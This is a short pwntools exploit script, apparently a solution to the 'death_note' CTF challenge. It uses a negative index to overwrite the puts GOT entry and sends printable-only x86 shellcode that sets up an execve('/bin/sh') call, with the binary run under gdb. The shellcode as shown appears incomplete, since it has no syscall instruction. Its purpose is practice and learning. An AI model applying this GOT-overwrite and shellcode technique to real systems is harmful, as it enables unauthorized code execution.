from pwn import *


def is_printable(s):
    for c in s:
        if c <= 0x1f or c >= 0x7f:
            print(f'Invalid character: {hex(c)}')
            return False
    return True


class Prompts:
    CHOICE = 'Your choice :'
    INDEX = 'Index :'
    NAME = 'Name :'


class Choice:
    ADD = '1'
    SHOW = '2'
    DELETE = '3'


PUTS_GOT_INDEX = str(-16)
death_note = ELF('death_note')

shellcode = f'''
push 0x2b       ; eax --> 0xb (SYS_EXECVE)
pop eax
xor al, 0x20
push ebx        ; 0x0
push 0x68732f6e ; /bin/sh
push 0x69622f2f
push ebx
pop edx         ; edx --> 0x0.
push esp
pop ebx         ; ebx --> "//bin/sh"
'''

p = gdb.debug(
    death_note.path,
    '''
    b *add_note+0xa0
    c
    '''
)

p.sendafter(Prompts.CHOICE, Choice.ADD)
p.sendafter(Prompts.INDEX, PUTS_GOT_INDEX)
p.sendlineafter(Prompts.NAME, asm(shellcode))
